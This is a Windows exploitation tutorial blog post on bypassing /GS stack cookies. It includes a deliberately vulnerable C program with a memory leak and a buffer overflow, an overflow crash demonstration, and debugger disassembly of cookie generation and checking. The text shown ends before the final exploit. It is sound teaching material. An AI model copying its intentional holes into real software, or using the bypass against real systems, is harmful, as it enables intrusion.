---
layout: post
title:  "Modern Windows Exploitation Part 1: Bypassing Stack Cookies (/GS)"
author: Clarissa Podell
date:   2018-07-12
comments: false
mathjax: false
toc: true
categories:
   - windows
   - exploit
tags:
   - windows
   - exploit
   - windbg
   - msfvenom
---

* A markdown unordered list which will be replaced with the ToC, excluding the "Contents header" from above
{:toc}

{% comment %}
![image-center](/assets/images/filename.jpg){: .align-center}

Justified text.
{: .text-justify}

## Index

- [Root folder](#root-folder)
- [Client](#client)
  - [client/package.json](#client-package)
  - [client/src/index.js](#client-src-index)
  - [client/src/reducers/](#client-src-reducers)
  - [client/src/actions/](#client-src-actions)
  - [client/src/App.js](#client-src-app)
- [Server](#server)
  - [server/package.json](#server-package)
  - [server/webpack.config.js](#server-webpack)
  - [server/src/index.js](#server-src-index)
  - [server/src/middlewares.js](#server-src-middlewares)
  - [server/src/db.json](#server-src-db)
  - [server/src/util.js](#server-src-util)
- [Verifying that it all works](#verifying)
  - [Development mode](#verifying-dev)
  - [Production mode](#verifying-prod)
- [Bonus: Production docker image](#docker)

This technique is popular in Windows exploits because there are many such commands at ﬁxed addresses in Kernel32.dll.These pairs can be used from almost any normal process.Because these are part of the kernel interface DLL,they are normally at ﬁxed addresses,which can be hardcoded.However,they probably differ between Windows versions,and may depend on which Service Pack is applied.

The amazing thing about overcoming mitigations is that there are ways to bypass it ... As with every known exploitation mitigation, there are ways to bypass it if certain conditions are met.  As with every known exploitation mitigation, there are ways to bypass it if certain conditions are met.
{% endcomment %}

# Introduction

:gem:
:octocat:
:trollface:
The purpose of this article is to demonstrate software exploitation on a modern Windows OS.  This short series of posts specifically focuses on bypassing basic exploit mitigation techniques.  

I was inspired to write this blog post after doing research for my senior capstone project on Windows exploitation.  I realized there was a lack of up-to-date information on the subject, so I thought it would be helpful (to others in the same situation) to write a few blog posts on the subject to share some of the tools and methods I used to hopefully help other people in the same situation.

This post is organized in the following way:  [Section 1] briefly discusses Windows exploit mitigations, [Section 2] breaks down the implementation of Stack Cookie (GS) protection in vulnerable code and identifies some potential vulnerabilities towards the end, [Section 3] describes setting up the exploit, and [Section 4] puts all the pieces together and describes the final exploit code.

[Section 1]: #overview-of-windows-mitigations "overview of mitigations"
[Section 2]: #vulnerability "GS vulnerability"
[Section 3]: #exploit-development
[Section 4]: #putting-it-all-together

## Overview of Windows Mitigations

The goal of exploit mitigation techniques is to make it more difficult for attackers to successfully exploit a software vulnerability.  There are a number of software and hardware mitigations built-in to all newer versions of Windows.  Some of these protections include:

Mitigations Make Exploitation harder

* **Address Space Layout Randomization (ASLR)** randomizes where important data is stored in memory to help mitigate malware attacks based on code that is loaded to predictable or discoverable memory locations.
  - `/DYNAMICBASE` linker switch
* **Data Execution Prevention (DEP)** marks pages of memory as non-executable using the no eXecute bit on modern CPUs to prevent injected code from being run from those pages.  Marking regions of memory, such as the heap and stack, as non-executable prevents injected code from being run from those pages / that region of memory, making the exploitation of buffer overruns more difficult.  DEP prevents code from being run from data pages such as the default heap, stacks, and memory pools.  The primary benefit of data execution prevention is that it helps to prevent code execution from data pages such as the default heap, various stacks and memory pools.
  - `/NXCOMPAT` linker switch
* **Stack Cookies (GS)** prevents the successful exploitation of stack-based (string) buffer overflows that overwrite the return address of a function call stored on the stack allowing for arbitrary code to be executed.
  - `/GS` compiler switch
* **Structured Exception Handling (SEH)**.  Exploits that overwrite the Structured Exception Handler is a popular technique in Windows that uses a stack-based buffer overflow to overwrite an exception registration record that has been stored on a thread's stack.  By corrupting the exception handler function pointer, the exception dispatcher can be made to execute arbitrary code.  There are two types of protections:
  1. **Structured Exception Handling Overwrite Protection (SEHOP)** is a run-time mechanism that validates exception chains.  SEHOP ensures that a thread's exception handler list is intact before allowing any of the registered exception handlers to be called.  SEHOP is enabled system-wide, so it protects apps regardless of whether they have been compiled with the latest improvements.  
  {% comment %} SEHOP inserts a symbolic exception registration record at the tail of a thread's exception handler list and walks the list at the time that an exception is being dispatched to ensure that the symbolic record can be reached and that it is valid.  If the symbolic record cannot be reached, the exception dispatcher can assume that an SEH overwrite may have occurred. {% endcomment %}
  2. **Safe Exception Handlers (SafeSEH)**.  When enforced, the linker builds a table of safe exception handlers in the PE header's metadata that are valid for the image.  A run-time exception will only be dispatched if the exception handler is registered in the image header.  Attempting to execute an unregistered exception handler will result in immediate program termination.  (`/SAFESEH` linker switch).
* **Control-Flow Guard (CFG)** combats the exploitation of memory corruption vulnerabilities by enforcing a program's intended control-flow.  CFG focuses on protecting indirect calls by preventing calls to locations other than function entry points in your code. CFG can detect an attacker’s attempt to change the intended flow of code.
  - `/guard` compiler and linker switch

  SafeSEH (compile-time exception handler registration)
  Software and hardware-enforced Data Execution Prevention (DEP)

Stack return address overwrite exploit technique rendered ineffective

The focus of this post will be on bypassing Microsoft's Stack Cookie, or GS, protection.  According to Microsoft docs [[1]],

>"/GS (Buffer Security Check) detects some buffer overruns that overwrite a function's return address, exception handler address, or certain types of parameters"

The compiler performs security checks on **GS buffers** defined as:
* An array larger than 4 bytes
* A buffer that is not a pointer type
* A structure that is more than 8 bytes
* A buffer allocated by `_alloca`

/GS also protects vulnerable parameters that are passed into a function. A vulnerable parameter is a pointer, a C++ reference, a C-structure that contains a pointer, or a GS buffer.

These are examples of buffers that are **not** protected by GS:

```c
// Pointer type buffer
char *buf_ptr[10];
// Size of buffer is too small
char buf[3];
// Structure is less than 8 bytes
struct { int a; char b; };
```


## The Vulnerable Code

In this post, I'll demonstrate how to bypass Stack Cookie protection in Windows 10 using the below C source code (`vuln.c`).  This code contains two simple yet realistic vulnerabilities which create the perfect conditions to launch this type of attack.  The first vulnerability appears in `memleak()` that prints arbitrary memory addresses from an uninitialized array on the stack and the second is a stack-based buffer overflow vulnerability that allows an attacker to corrupt and hijack the return address of `overflow()`.

```c
#include <stdio.h>
#include <string.h>
#define STDIN 0

void memleak(){
	char buf[64];
	int nr, i;
	unsigned int *value;
	value = (unsigned int*)buf;
	if( scanf("%d", &nr) == 0 ) {
		while( fflush( stdin ) != 0)
			;
	}
	for(i=0; i < nr; i++)
		printf("0x%08x ", value[i]);
}

void overflow() {
	char buf[1024];
	read(STDIN, buf, 2048);
}

void main(int argc, char* argv[]) {
	setbuf(stdout, NULL);
	printf("printf> ");
	memleak();
	printf("\nread> ");
	overflow();
	printf("\ndone.\n");
}
```
<figcaption>Figure:  Vulnerable target program. <code>vuln.c</code> source code</figcaption>

The line `read(STDIN, buf, 2048)` in `overflow()` will overflow if more than 1024 bytes are read into character array `buf[1024]`.  Because the C library function `read()` does not enforce buffer size restrictions, we can write past `buf`'s allocated region in memory and corrupt the adjacent stack contents.  This potentially overwrites important control values stored on the stack.

A visual representation of hijacking the return address is shown below.

When `/GS` is enforced, a program generated master security cookie (4 bytes (dword), unsigned int) is initialized at startup and saved in the data section of memory.  

Security Checks:
On functions that the compiler recognizes as subject to buffer overrun problems, the compiler allocates space on the stack before the return address. On function entry, the allocated space is loaded with a security cookie that is computed once at module load.
When enforced, the compiler allocates space for a 4 byte dword on the stack before the return address. On function entry, the allocated space is loaded with a program-wide security cookie that is computed once at module load. On function exit, and during frame unwinding on 64-bit operating systems, a helper function is called to make sure that the value of the cookie is still the same. A different value indicates that an overwrite of the stack may have occurred. If a different value is detected, the process is terminated.
When this happens,the return address is overwritten,allowing for arbitrary code to be executed.

### Setup

Everything here was run on my personal laptop which is host to a Windows 10 64-bit OS (version 1709 build 16299.492).  All source code is compiled using Visual Studio 2015 Build Tools and the x86 Native Tools Command Prompt for x86 output files.  It's my personal preference to write code in a text editor and then compile in a terminal, but the Visual Studio IDE can be easily substituted.  The command-line toolsets come installed when selecting the *platform toolset* workload in the Visual Studio C++ Installer.  [Click here] to read more about building on the command line.

[Click here]: https://docs.microsoft.com/en-us/cpp/build/building-on-the-command-line

Compile the code with the below command in one of the VS command prompts:

```console
C:\blog> cl /Zi vuln.c /link /NXCOMPAT:NO
```

This produces `vuln.exe`, a 32-bit PE file format executable with debugging information (`/Zi`).  Note that `/NXCOMPAT:NO` disables Data Execution Prevention (DEP) in the linker (read my [next post]({{ site.baseurl }}{% link _posts/2018-07-19-windows-bypass-2.md %}) to learn how to bypass DEP).  Because Stack Cookie (`/GS`) protection is enabled by default in Windows, we do not need to explicitly pass any options to the compiler.

Running the program will prompt the user for input from the keyboard (stdin).  The first `printf>` requires an integer and the second `read>` prompts for arbitrary text.  It's a good idea to run the binary a few times before diving in to the exploitation.  First we'll run the program normally providing small input.

```console
C:\blog\part1> vuln.exe
printf> 40
0x005af8ec 0x010374c4 0x00000004 0x00000000 0x0109e0b0 0x0109e00c 0x00000000 0x005af918 0x005af90c 0x01037546 0x0109e0b0 0x0109e00c 0x00000000 0x005af918 0x00000008 0x00000000 0x5374937e 0x005af918 0x0103740a 0x005af960 0x010377bf 0x00000001 0x00ada680 0x00adf8d0 0x5374930e 0x010316b8 0x010316b8 0x007bc000 0x00000000 0x010316b8 0x000316b8 0x005af92c 0x00000000 0x005af9ac 0x010388f0 0x5227bebe 0x00000000 0x005af974 0x76aa8484 0x007bc000
read> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

done.
```

Now run it again, this time providing a string larger than 1024 characters.

```console
C:\blog\part1> vuln.exe
printf> 40
0x00eff804 0x010874c4 0x00000004 0x00000000 0x010ee0b0 0x010ee00c 0x00000000 0x00eff830 0x00eff824 0x01087546 0x010ee0b0 0x010ee00c 0x00000000 0x00eff830 0x00000008 0x00000000 0x67174a99 0x00eff830 0x0108740a 0x00eff878 0x010877bf 0x00000001 0x0128a680 0x0128f8d0 0x67174ac9 0x010816b8 0x010816b8 0x00c10000 0x00000000 0x010816b8 0x000816b8 0x00eff844 0x00000000 0x00eff8c4 0x010888f0 0x66f66661 0x00000000 0x00eff88c 0x76aa8484 0x00c10000
read> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

This results in a program crash that triggers my postmorten debugger which is set to WinDbg.  I see the below screen when the program crashes:

```
(abc8.1b1f8): Security check failure or stack buffer overrun - code c0000409 (!!! second chance !!!)
eax=00000001 ebx=00c10000 ecx=00000002 edx=000001e0 esi=010efe14 edi=010efe18
eip=0108792c esp=00eff0f8 ebp=00eff41c iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
vuln!__report_gsfailure+0x17:
0108792c cd29            int     29h
```

As expected, the OS triggers the GS exception `Security check failure or stack buffer overrun - code c0000409`.

You can use `!analyze -v` for additional information on the crash.  This provides a detailed stack buffer overrun analysis and tells us that "positively an overflow from beginning of candidate buffer".  It also displays the faulting IP and stack name, exception record, corrupted memory and `__report_gsfailure` frame that outputs the corrupted / expected cookie, memory and function name among other things.  The command can be used in any user-mode or kernel crash.

# Vulnerability

To understand how this actually works in more detail, consider the following disassembly from an application compiled with version 14.00.50727.42 of Microsoft's compiler. Going straight to the disassembly is the best way to concretely understand the implementation, especially if one is in search of weaknesses.

Stack cookie protection debugging & demonstration

# Reversing the /GS Security Cookie

The exact implementation of stack cookies vary by compiler and OS.  In Linux systems for example, its implemented as a stack "canary" and enforced through the GCC compiler switch `-fstack-protector`.  In general, stack smashing mitigations that use a cookie or canary tend to have three general steps in common:

1. Cookie generation.  Initializes a master module cookie or canary.  This step varies the most between different implementations.
2. Prologue (function entry routine) code modifications involves insertion of code to copy master cookie onto the stack.
3. Epilogue (function exit routine) code modifications involve insertion of code to perform a security check that compares the master cookie with the stack version to detect corruption.

In this section, I'll go through the implementation of each step in Windows' GS.

The remainder of this section will describe each of these three steps to paint a picture for how GS operates.  Going straight to the disassembly is the best way to concretely understand the implementation, especially if one is in search of weaknesses.

Before strategizing a bypass method, we need a better idea of how the cookie is implemented in our program.  Loading `vuln.exe` in a debugger like WinDbg demonstrates some cookie behavior.

---

The following command in WinDbg finds all symbols (local variables, function names, call parameters, etc.) related to the cookie.  The general symbol syntax is `mymodule!main` where (!) separates the module name (exe or dll) from the symbol name.

```nasm
0:000> x /v vuln!*cookie*
prv global 0109e02c    4 vuln!__security_cookie_complement = 0x44bf19b1
prv global 0109e030    4 vuln!__security_cookie = 0x1344d51e
prv func   010375b8   11 vuln!__security_check_cookie (unsigned int)
prv func   010388b0   32 vuln!ValidateLocalCookies (struct _EH4_SCOPETABLE *, char *)
prv func   01038181   9c vuln!__security_init_cookie (void)
```

The display provides useful information such as the symbol type (local, global, function, etc.), starting address of each symbol, the full name, and its size in bytes.  The two global variables display its current value and the functions display a list of its argument types.

We can use this information to set breakpoints, search memory, or view disassembly.  This also tells us that the program cookie is stored in global variable `vuln!__security_cookie`, the security check function is called `vuln!__security_check_cookie()` and the initialization function is `vuln!__security_init_cookie()`.



In Immunity Debugger, *Run Trace* will log each instruction the program executes in addition to the current register state, address, etc. until it either hits a breakpoint or terminates.  This automates the process of stepping through the instructions by hand.  I run this by first setting a program breakpoint on `main()` in `vuln.exe`, start running the program in the debugger, then select either "Trace into" (Ctrl+F11) or "Trace over" (Ctrl+F12) from the toolbar.  It gives the option to view the output in the debugger window and/or write it to a text file.

The first column is the number of instructions executed.  Number 0 is the most recent instruction ran and 24988 (in the below case) is the first instruction executed.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/runtrace.PNG" alt="ImmDbg RT">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/runtrace.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

```
Address	       Thread  Command	Registers and comments
mainCRTStartup
013378D7       Main    call vuln.01332F1D	ESP=004FF790
01332F1D	   Main	   jmp vuln.__security_init_cookie
__security_init_cookie
               Main	   push ebp	            ESP=004FF78C
01338182	   Main	   mov ebp,esp	        EBP=004FF78C
01338184	   Main	   sub esp,14	        ESP=004FF778
01338187	   Main	   and dword ptr ss:[ebp-C],0
0133818B	   Main	   and dword ptr ss:[ebp-8],0
0133818F	   Main	   mov eax,dword ptr ds:[__security_cookie]	EAX=CC77AF55
01338194	   Main	   push esi	ESP=004FF774
01338195	   Main	   push edi	ESP=004FF770
01338196	   Main	   mov edi,BB40E64E	EDI=BB40E64E
0133819B	   Main	   mov esi,FFFF0000	ESI=FFFF0000
013381A0	   Main	   cmp eax,edi
013381A2	   Main	   je short vuln.013381B1
013381A4	   Main	   test esi,eax
013381A6	   Main	   je short vuln.013381B1
013381A8	   Main	   not eax	EAX=338850AA
013381AA	   Main	   mov dword ptr ds:[__security_cookie_complement],eax
013381AF	   Main	   jmp short vuln.01338217
01338217	   Main	   pop edi	ESP=004FF774, EDI=013316B8
01338218	   Main	   pop esi	ESP=004FF778, ESI=013316B8
01338219	   Main	   mov esp,ebp	ESP=004FF78C
0133821B	   Main	   pop ebp	ESP=004FF790, EBP=004FF7A4
0133821C	   Main	   retn	ESP=004FF794
013378DC	   Main	   jmp vuln.__scrt_common_main_seh
```

## Cookie Generation - Initializing the Security Cookie

Microsoft's GS uses a pseudo-randomized XOR security cookie that is generated from multiple data sources in the program.

When GS is enforced, the compiler allocates space on the stack after local variables and before the return address.  This space is loaded with a program-wide cookie that is computed once at module load and saved as a global value in the .data section of memory.
[buffer][cookie][saved EBP][saved EIP]

<div class="mermaid">
graph LR;
    id1(" ") -- Top of Stack --> Buffer --> Cookie --> EBP --> EIP;
</div>

The program-wide cookie is initialized on entry to an EXE or DLL in the function `__security_init_cookie()`.  It's actually one of the very first things to execute.  In a program trace starting at the module entry point `vuln!mainCRTStartup`, the second instruction the program executes is a jump to `vuln.__security_init_cookie`.

Disassembling the initialization routine shows how the program cookie is generated.  The command `uf [address]` in WinDbg disassembles a function.

```nasm
0:000> uf vuln!__security_init_cookie
; ... (snipped)
vuln!__security_init_cookie+0x30:
00f081b1 8d45f4          lea     eax,[ebp-0Ch]
00f081b4 50              push    eax
00f081b5 ff152010f700    call    dword ptr [vuln!_imp__GetSystemTimeAsFileTime (00f71020)]
00f081bb 8b45f8          mov     eax,dword ptr [ebp-8]   ; move the low order 32-bits into eax
00f081be 3345f4          xor     eax,dword ptr [ebp-0Ch] ; XOR with the high order 32-bit integer
00f081c1 8945fc          mov     dword ptr [ebp-4],eax
00f081c4 ff151c10f700    call    dword ptr [vuln!_imp__GetCurrentThreadId (00f7101c)]
00f081ca 3145fc          xor     dword ptr [ebp-4],eax
00f081cd ff151810f700    call    dword ptr [vuln!_imp__GetCurrentProcessId (00f71018)]
00f081d3 3145fc          xor     dword ptr [ebp-4],eax
00f081d6 8d45ec          lea     eax,[ebp-14h]
00f081d9 50              push    eax
00f081da ff151410f700    call    dword ptr [vuln!_imp__QueryPerformanceCounter (00f71014)]
00f081e0 8b4df0          mov     ecx,dword ptr [ebp-10h]
00f081e3 8d45fc          lea     eax,[ebp-4]
00f081e6 334dec          xor     ecx,dword ptr [ebp-14h]
00f081e9 334dfc          xor     ecx,dword ptr [ebp-4]
00f081ec 33c8            xor     ecx,eax
00f081ee 3bcf            cmp     ecx,edi
00f081f0 7507            jne     vuln!__security_init_cookie+0x78 (00f081f9)
```

The disassembly generates the cookie by XOR'ing the result of four different Windows API functions: `GetSystemTimeAsFileTime()`, `GetCurrentThreadId()`, `GetCurrentProcessId()`, and `QueryPerformanceCounter()`.

The first three are straightforward:
* `GetSystemTimeAsFileTime` retrieves the current system date and time.  This returns a 64-bit number.
* `GetCurrentThreadId` retrieves the thread identifier of the calling thread, and
* `GetCurrentProcessId` retrieves the process identifier of the calling process

An observation is that these values aren't generated *so* randomly.  If exploiting a system locally, the current TID and PID can be obtained by querying a Windows app such as task manager, `tlist` or procdump, and the system date and time can *reasonably* be guessed, approximated, or brute-forced.

The fourth function `QueryPerformanceCounter` retrieves the current value of the performance counter with a resolution of 1 microsecond.  The performance counter is a measure of time that describes the total number of cycles that have executed as the cookie was being generated.  According to this [article by skape][2], the performance counter is the only data source that presents a challenge in terms of entropy.  The authors attempted to calculate this value and reported that ... We also have to take into consideration that since this was reported in 2007, Microsoft has likely improved this in newer releases of Visual Studio.

The end result of XOR'ing these four sources together is what ends up being the program-wide security cookie.  A few checks are done to ensure a valid cookie has been generated then it's stored in `__security_cookie` along with it's bit-wise complement in `__security_cookie_complement` as shown below.

```nasm
vuln!__security_init_cookie+0x88:
00f08209 890d30e0f600    mov     dword ptr [vuln!__security_cookie (00f6e030)],ecx
00f0820f f7d1            not     ecx
00f08211 890d2ce0f600    mov     dword ptr [vuln!__security_cookie_complement (00f6e02c)],ecx
00f08217 5f              pop     edi
00f08218 5e              pop     esi
00f08219 8be5            mov     esp,ebp
00f0821b 5d              pop     ebp
00f0821c c3              ret
```

{% comment %}
The approximate complexity of brute-forcing a cookie is 2^21 to 2^23
The first too are generated not so randomly (check PIDs in Task Manager). The other 3 are timers.  If exploiting something locally, timers can be determined pretty acurately, if exploiting remotely, it’s not that easy. As the process being exploited will raise an error if you don’t know the right value, and as the precision for QueryPerformanceCounter() is really high, bruteforcing is not that straight forward.
We haven’t thoroughly tested the randomness of the security cookies, but our first attempts show that 21 to 23 bits need to be bruteforced out of the 32. We know timers are not a good random source, for example, given two consecutives values is easy to predict the next, however, we are not sure if this is enough to successfully exploit programs protected with Microsoft’s /GS option.

right before the saved EBP and EIP.
[buffer][cookie][saved EBP][saved EIP]

In simpler terms, the meat of the cookie generation can basically be summarized through the following pseudo code:
Cookie  = SystemTimeHigh
Cookie ^= SystemTimeLow
Cookie ^= ProcessId
Cookie ^= ThreadId
Cookie ^= TickCount
Cookie ^= PerformanceCounterHigh
Cookie ^= PerformanceCounterLow
{% endcomment %}

## Prologue and Epilogue

**tldr;** *the program-wide security cookie is stored on the stack in the prologue and compared again in the epilogue before allowing the function to return.*

The compiler inserts code in each function that contains a [vulnerable] GS buffer or function parameter to enforce the validity of the cookie at runtime.  Here I'll demonstrate how this code works / is implemented using our sample vulnerable program.

[vulnerable]: #overview-of-windows-mitigations "Overview of Windows Mitigations"

### Prologue

The stack cookie is first put in EAX and then XORed with EBP. It is then put on the stack (at 0x001268)

In the function prologue, three lines of assembly code are inserted by the compiler.

We'll start by setting / Let's set a breakpoint (FN+F2) in memleak() and step through each instruction in Immunity debugger.  The **red**{: style="background: red; color: black"} highlighted address indicates a software breakpoint has been set and the **black**{: style="background: black; color: white"} highlighted address is the current instruction being executed by the debugger.

###### Line 1: `mov eax, dword ptr [__security_cookie]`

Below, the program is about to execute the first line of GS code.  This line copies the program cookie from `__security_cookie` onto the stack in `eax`.   

The current register state is displayed in the small window below the disassembly output.  Right before this instruction executes, the program cookie stored in the data section at `ds:[00B3E034]` contains the value `EF81BD51` and eax is currently 8.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/gs-pro-1.PNG" alt="GS Prolog 1">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/gs-pro-1.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

###### Line 2: `xor eax, ebp`

The second line of GS code performs a logical XOR of the cookie in `eax` with the address of `ebp`.  Before this instruction, eax contains the value of the program cookie `0xEF81BD51` and ebp is `0x00ABFC2C`.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/gs-pro-2.PNG" alt="GS Prolog 2">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/gs-pro-2.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

###### Line 3: `mov dword ptr [ebp-4], eax`

The XOR'ed result in `eax`, which is `0xEF2A417D`, is then put on the stack at `[ebp-4]` (`0x00ABFC28`).  This location is between the local variables and the return address.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/gs-pro-3.PNG" alt="GS Prolog 3">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/gs-pro-3.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

After this line executes, we can see the XOR'ed cookie `0xEF2A417D` on the stack at `0x00ABFC28`.

<div class="img-center">
<a href="{{ site.baseurl }}/images/gs-pro-3a.PNG" title="Zoom In">
<img src="{{ site.baseurl }}/images/gs-pro-3a.PNG" alt="GS Prolog 3a">
</a>    
</div>

```nasm
0:000> uf vuln!overflow
vuln!overflow:
;  Normal entry routine
00f073a0 55              push    ebp
00f073a1 8bec            mov     ebp,esp
00f073a3 81ec04040000    sub     esp,404h
;  Compiler added GS support
00f073a9 a130e0f600      mov     eax,dword ptr [vuln!__security_cookie (00f6e030)]
00f073ae 33c5            xor     eax,ebp
00f073b0 8945fc          mov     dword ptr [ebp-4],eax
```

### Epilogue

The function epilogue tells a similar story.  Three lines of assembly code are inserted right before the function returns.  

###### Line 1:  `mov ecx, dword ptr [ebp-4]`

The first GS instruction moves the stack version of the cookie into `ecx`.

The first line retrieves a copy of the stack's cookie from `[ebp-4]` and moves it into `ecx`.  Before this runs, the stack cookie at `0x00ABFC28` contains `0xEF2A417D`.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/gs-epi-1.PNG" alt="GS Epilogue 1">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/gs-epi-1.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

###### Line 2: `xor ecx, ebp`

The next line performs a second XOR with the current frame pointer `0x00ABFC2C` to get it back to the original security cookie.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/gs-epi-2.PNG" alt="GS Epilogue 2">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/gs-epi-2.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

###### Line 3: `call __security_check_cookie`

Lastly, a call to `__security_check_cookie()` is made.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/gs-epi-3.PNG" alt="GS Epilogue 3">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/gs-epi-3.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

## Security Check Function

This is the function that implements the GS cookie protection.  It's pretty simple.  Either it allows the function to return or it invokes a failure function and terminates execution.

 If it fails,  then control jumps to `__security_check_cookie+0xb` where the failure function is called `___report_gsfailure` and the program terminates early.

###### Line 1: `cmp ecx,dword ptr [__security_cookie]`

The security check function compares the stack frame's cookie in `ecx` with the program-wide master cookie in `__security_cookie` at `0x00B3E034`.  At the time this function is called / When this function is called from `memleak()`, the current values are:

This function is called from `memleak()` with the following values:

* program-wide stack cookie  = `0xEF81BD51`
* ecx (stack copy of cookie) = `0xEF81BD51`

Based on these values, the check will pass.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/gs-check-1.PNG" alt="GS Check 1">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/gs-check-1.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

###### Line 2:  `retn` (Comparison passes)

if equal, return to next instruction in calling function

The above comparison will pass since the program cookie = stack copy.  Next, the program jumps to address 00AD75C1 and `retn`'s back to the end of `memleak()`.  The rest of the program will execute as normal.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/gs-check-2.PNG" alt="GS Check 2">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/gs-check-2.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>


```nasm
;  Compiler added GS support
00f073c9 8b4dfc          mov     ecx,dword ptr [ebp-4]
00f073cc 33cd            xor     ecx,ebp
00f073ce e83ac1ffff      call    vuln!ILT+9480(__security_check_cookie (00f0350d)
;  Normal exit routine
00f073d3 8be5            mov     esp,ebp
00f073d5 5d              pop     ebp
00f073d6 c3              ret
```

```nasm
0:000> uf vuln!__security_check_cookie
vuln!__security_check_cookie:
;  Compare local stack cookie with program-wide cookie
00f075b8 3b0d30e0f600    cmp     ecx,dword ptr [vuln!__security_cookie (00f6e030)]
;  If not equal, jump to GS failure routine
00f075be f27502          bnd jne vuln!__security_check_cookie+0xb (00f075c3)  Branch

vuln!__security_check_cookie+0x9:
;  Otherwise, if equal, return to next instruction in calling function
00f075c1 f2c3            bnd ret  Branch

vuln!__security_check_cookie+0xb:
00f075c3 f2e99fc3ffff    bnd jmp vuln!ILT+10595(___report_gsfailure) (00f03968)  Branch
```

# Example of Stack Corruption

So, what happens in a stack-based buffer overflow when GS is enforced?

Below is a visual representation of the runtime stack in `vuln.exe` labeled with offsets to the base pointer `ebp`.

The overwritten stack on the right demonstrates what happens in memory during a typical buffer overflow attack that attempts to overwrite the return address.  The attacker-controlled data (represented by "AAAAA...") is written starting at the address of `buf` and continues downward toward higher addresses corrupting `overflow()`'s stack frame.  Data larger than 1024 bytes will overflow `buf` and immediately overwrite the adjacent memory contents.

<div class="img-container">
<img class="image" src="{{ site.baseurl }}/images/vuln-stack.PNG" alt="stack">
   <div class="overlay">
    <a href="{{ site.baseurl }}/images/vuln-stack.PNG" class="overlay-icon" title="Zoom In">
      <i class="fas fa-search-plus"></i>
    </a>
  </div>
</div>

<a href="{{ site.baseurl }}/images/vuln-stack.PNG">
<img class="img-center" src="{{ site.baseurl }}/images/vuln-stack.PNG">
</a>

As illustrated, the attempt to overwrite the saved EIP also overwrites the cookie.  When the security check function runs at the end of `overflow()`, it will notice that the local copy of the cookie stored on the stack in `ebp-4` has been overwritten with `0x41414141` (AAAA) and will terminate execution.

## Stack Corruption in Immunity

To demonstrate this behavior, open the executable in Immunity (File -> Open -> `vuln.exe`), set a breakpoint on `overflow()`, and run the program (FN+F9) until it hits the breakpoint.  With the program paused, step over instructions until the program prompts for input (during its call to `read()`).  A string longer than 1024 bytes is needed to overflow the buffer.  

